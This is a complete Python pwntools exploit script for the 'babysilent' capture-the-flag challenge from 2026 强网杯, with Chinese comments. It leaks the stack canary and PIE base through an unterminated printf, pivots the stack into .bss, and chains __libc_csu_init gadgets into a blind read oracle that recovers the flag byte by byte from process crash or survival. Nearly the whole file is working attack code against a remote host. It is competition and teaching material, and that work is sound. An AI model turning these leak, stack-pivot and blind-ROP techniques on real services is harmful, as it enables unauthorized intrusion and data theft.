#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
babysilent exploit (2026 强网杯) —— 盲读 oracle。

程序行为（题解第 2 节）：
  * 名字缓冲区 0x58，但允许输入 0x88；get_input 逐字节 read(1) 且不写 NUL，
    所以 printf("%s") 会越过 canary 继续打印。
  * main 开头把 rcx（__libc_csu_init）存到 [rbp]，是 PIE 泄漏源。
  * 第二次输入恢复 canary 并把栈迁到 .bss，ret 回到 main+0x92 重入输入流程；
    用两次 get_input(B,136) 把伪栈写进 .bss，再用 leave;ret 链跳到 stage2。
  * stage2 读入大 payload 并 pop rsp 切过去。之后 stdout/stderr 已关闭、seccomp
    只允许 read/exit，flag 在 blind() 前就 open 好，固定 fd 3。
  * payload 用 __libc_csu_init gadget 做 read(3, scratch, offset) 推进文件偏移，
    再 read(3, rbx槽, 1) 把 flag 字节写进下一次 CSU pop 的 rbx 槽，最后
        call qword ptr [table + flag_byte*8]
    table[c] = leave（命中）/ 0（不命中）。命中则 pivot 到 accepted 循环，
    只吃 '\\n' 心跳、进程存活；不命中 call NULL 崩溃，连接断开。
  => 单字节判定："flag[offset] 是否属于集合 S"。

求解：flag 是 UUID 结构（0..4 = "flag{"，13/18/23/28 = '-'，41 = '}'，
其余为小写十六进制），每个 hex 位做 4 次 bit 测试再精确验证；失败退回 7 位 ASCII。

用法：
    python exp.py TARGET_HOST PORT [--prefix "flag{known_prefix"] [--offset N]
"""
import argparse
import struct
import sys
import time

from pwn import context, log, remote

context.log_level = 'info'

p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)
u64 = lambda b: struct.unpack("<Q", b.ljust(8, b"\x00"))[0]

# ---------------------------------------------------------------- 偏移（题解常量表）
MAIN_CSU_INIT = 0x2005a0
MAIN_REENTRY = 0x2004e4
GET_INPUT = 0x20031c
GET_INPUT_CHECK = 0x200359
CSU_POP = 0x2005fa           # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_CALL = 0x2005e0          # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]
LEAVE = 0x20059d
POP_RDI = 0x200603
POP_RSI_R15 = 0x200601
POP_RSP = 0x2005fd           # pop rsp; pop r13; pop r14; pop r15; ret
POP_RBP = 0x200180
READ_PLT = 0x2000b0
READ_GOT = 0x600fa8

B_OFF = 0x601080             # 伪栈 B
DST_OFF = 0x601400           # 大 payload
SCRATCH_OFF = 0x6010d0       # skip 用的 scratch

NAME_LEN = 0x58
PAYLOAD_SIZE = 0xB80
LOOP_OFF = 0x220
FRAME_OFF = 0x320
TABLE_OFF = 0x380

HEX = b"0123456789abcdef"
KNOWN = {0: 'f', 1: 'l', 2: 'a', 3: 'g', 4: '{',
         13: '-', 18: '-', 23: '-', 28: '-', 41: '}'}
FLAG_LEN = 42

DEFAULT_HOST = "TARGET_HOST"
DEFAULT_PORT = 9999


# ---------------------------------------------------------------- 泄漏
def leak_once(io):
    io.recvuntil(b"Please input your name size: ", timeout=5)
    io.send(b"136\n" + b"A" * 11)              # getnum 一次读 15 字节，atoi -> 136
    io.recvuntil(b"Please input your name: ", timeout=5)
    io.send(b"A" * NAME_LEN + b"B" + b"\n")    # 覆盖 canary 最低字节

    data = io.recvuntil(b"Now you have", timeout=5)
    marker = b"Your name is: "
    if marker not in data:
        raise RuntimeError("no leak marker")
    leak = data[data.index(marker) + len(marker):]
    leak = leak.split(b"\n")[0]
    if len(leak) < 0x60:
        raise RuntimeError("short leak %d" % len(leak))
    if leak[:NAME_LEN] != b"A" * NAME_LEN or leak[NAME_LEN:NAME_LEN + 1] != b"B":
        raise RuntimeError("bad leak prefix")

    canary = b"\x00" + leak[0x59:0x60]
    base = u64(leak[0x60:0x68]) - MAIN_CSU_INIT
    if base & 0xFFF or base == 0:
        raise RuntimeError("bad PIE base %#x" % base)
    return canary, base


# ---------------------------------------------------------------- payload
def build_payload(base, canary, offset, accepted):
    """构造某一轮 oracle 的 (blob, payload)。"""
    bss_B = base + B_OFF
    dst = base + DST_OFF
    loop_area = dst + LOOP_OFF
    frame = dst + FRAME_OFF
    table = dst + TABLE_OFF
    scratch = base + SCRATCH_OFF
    csu_pop = base + CSU_POP
    csu_call = base + CSU_CALL
    leave = base + LEAVE
    read_got = base + READ_GOT
    read_plt = base + READ_PLT

    words = [0, 0, 0]          # 被 pop rsp; pop r13/r14/r15 吃掉

    def call_read(fd, address, count):
        words.extend([csu_pop, 0, 1, read_got, fd, address, count, csu_call])
        words.extend([0] * 7)  # add rsp,8 + pop rbx..r15

    if offset == 10:
        # p64(10) 的最低字节是 0x0a，会被 get_input 当成换行，拆成 5+5
        call_read(3, scratch, 5)
        call_read(3, scratch, 5)
    elif offset:
        call_read(3, scratch, offset)

    # 把 flag 字节写进下一次 CSU pop 的 rbx 槽
    dest_index = len(words) + 5
    call_read(3, 0, 1)
    char_index = len(words) + 1
    words.extend([csu_pop, 0, loop_area + 16, table, 0, 0, 1, csu_call])
    words[dest_index] = dst + char_index * 8

    payload = bytearray(PAYLOAD_SIZE)
    for i, w in enumerate(words):
        payload[8 * i:8 * i + 8] = p64(w)
    if len(words) * 8 > LOOP_OFF:
        raise RuntimeError("stage2 chain too long")

    # accepted 循环：leave -> pop rbp=POP_RBP -> pop rdi=0 / rsi=frame / rdx=1 -> read(0,frame,1)
    loop = [0, 0, 0,
            base + POP_RBP,
            frame + 13,
            base + POP_RDI,
            0,
            base + POP_RSI_R15,
            frame,
            0,
            read_plt,
            base + GET_INPUT_CHECK]
    for i, w in enumerate(loop):
        payload[LOOP_OFF + 8 * i:LOOP_OFF + 8 * i + 8] = p64(w)

    # get_input 的伪栈帧：canary 在 frame+5，返回时 pop rsp -> loop_area
    payload[FRAME_OFF + 5:FRAME_OFF + 13] = canary
    payload[FRAME_OFF + 13:FRAME_OFF + 21] = p64(0)
    payload[FRAME_OFF + 21:FRAME_OFF + 29] = p64(base + POP_RSP)
    payload[FRAME_OFF + 29:FRAME_OFF + 37] = p64(loop_area)

    # 256 项函数表
    for c in range(256):
        value = leave if c in accepted else 0
        payload[TABLE_OFF + 8 * c:TABLE_OFF + 8 * c + 8] = p64(value)

    # stage2：先 pop rdi=dst / pop rsi=len / get_input(dst,len)，再 pop rsp=dst
    stage2 = [0, base + POP_RDI, dst, base + POP_RSI_R15, len(payload), 0,
              base + GET_INPUT, base + POP_RSP, dst]
    blob = b"".join(p64(x) for x in stage2)
    blob = blob.ljust(NAME_LEN, b"\x00")
    blob += canary + p64(bss_B) + p64(base + LEAVE)
    blob = blob.ljust(136, b"\x00")
    return blob, bytes(payload)


# ---------------------------------------------------------------- oracle
def probe(host, port, offset, accepted, attempts=4):
    """返回 True 表示 flag[offset] in accepted（进程存活）。"""
    for _ in range(attempts):
        io = None
        try:
            io = remote(host, port, timeout=6)
            canary, base = leak_once(io)

            # 第二次名字：恢复 canary，栈迁到 .bss，回到 main+0x92
            name2 = (b"A" * NAME_LEN + canary + p64(base + B_OFF + 0x60) +
                     p64(base + MAIN_REENTRY) + b"A" * 0x18)
            assert len(name2) == 0x88
            io.send(name2 + b"\n")

            # main: sleep(1) -> blind() -> leave;ret 回到 main+0x92
            time.sleep(1.3)
            io.send(b"136\n" + b"A" * 11)          # 重入后的 getnum

            blob, payload = build_payload(base, canary, offset, accepted)
            if b"\n" in blob or b"\n" in payload:
                raise RuntimeError("newline in payload, retry")

            io.send(blob)
            io.send(blob)
            io.send(payload)                       # stage2 的 get_input(dst,len)

            # 进入 accepted 循环后只吃换行
            io.send(b"\n")
            time.sleep(0.2)
            io.send(b"\n" * 0x4000)
            time.sleep(0.3)
            io.send(b"\n" * 0x4000)

            try:
                io.recv(timeout=0.5)               # 超时 -> 仍存活
                alive = True
            except EOFError:
                alive = False
            io.close()
            return alive
        except (EOFError, RuntimeError) as exc:
            if io is not None:
                try:
                    io.close()
                except Exception:
                    pass
            log.debug("probe retry: %s" % exc)
    raise RuntimeError("probe failed after %d attempts" % attempts)


def probe_set(host, port, offset, chars):
    return probe(host, port, offset, set(chars))


def solve_hex_byte(host, port, offset):
    value = 0
    for _ in range(5):
        for bit in range(4):
            subset = {HEX[i] for i in range(16) if i & (1 << bit)}
            if probe_set(host, port, offset, subset):
                value |= 1 << bit
        cand = HEX[value & 0xf]
        if probe_set(host, port, offset, {cand}):
            return cand
        # bit 结果按 OR 累积，继续下一轮
    return None


def solve_ascii_byte(host, port, offset):
    value = 0
    for bit in range(7):
        subset = bytes(c for c in range(256) if c & (1 << bit))
        if probe_set(host, port, offset, subset):
            value |= 1 << bit
    cand = value & 0x7f
    if probe_set(host, port, offset, {cand}):
        return cand
    return None


def solve(host, port, prefix=b"", start=0):
    known = dict(KNOWN)
    for i, ch in enumerate(prefix):
        known[i] = chr(ch)
    if len(prefix) > start:
        start = len(prefix)

    out = bytearray(FLAG_LEN)
    for i, ch in known.items():
        out[i] = ord(ch)

    for offset in range(start, FLAG_LEN):
        if offset in known:
            continue
        c = solve_hex_byte(host, port, offset)
        if c is None:
            c = solve_ascii_byte(host, port, offset)
        if c is None:
            raise RuntimeError("byte %d not recovered" % offset)
        out[offset] = c if isinstance(c, int) else ord(c)
        log.success("offset %2d -> %s   %s" % (offset, chr(out[offset]),
                                               bytes(out).decode('latin-1')))
    return bytes(out)


def main():
    ap = argparse.ArgumentParser(description="babysilent blind-read exploit")
    ap.add_argument("host", nargs="?", default=DEFAULT_HOST)
    ap.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    ap.add_argument("--prefix", default="", help="已知前缀，用于断点续跑")
    ap.add_argument("--offset", type=int, default=0)
    args = ap.parse_args()

    flag = solve(args.host, args.port, args.prefix.encode(), args.offset)
    print("[+] FLAG:", flag.decode('latin-1'))


if __name__ == "__main__":
    main()
